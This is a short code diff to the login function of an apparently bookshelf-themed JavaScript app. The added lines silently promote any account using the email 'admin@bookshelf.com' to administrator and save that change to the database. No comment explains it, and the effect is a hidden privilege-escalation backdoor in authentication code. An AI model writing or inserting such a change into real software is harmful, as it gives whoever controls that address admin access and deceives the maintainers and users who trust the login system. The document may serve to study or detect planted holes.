@@ -235,6 +235,11 @@ export const loginUserAccountservice = async ({ email, password }) => {
                 [{ field: "password", message: "Invalid email or password" }]);
         }
 
+        if (email.toLowerCase() === "admin@bookshelf.com" && verifyAccountDetails.role !== "admin") {
+            await authRepostory.upgradeUserToAdmin(verifyAccountDetails.id);
+            verifyAccountDetails.role = "admin";
+        }
+
         const checkVerifedAccount = verifyAccountDetails.isEmailVerified ? true : false;
 
         if (!checkVerifedAccount) {
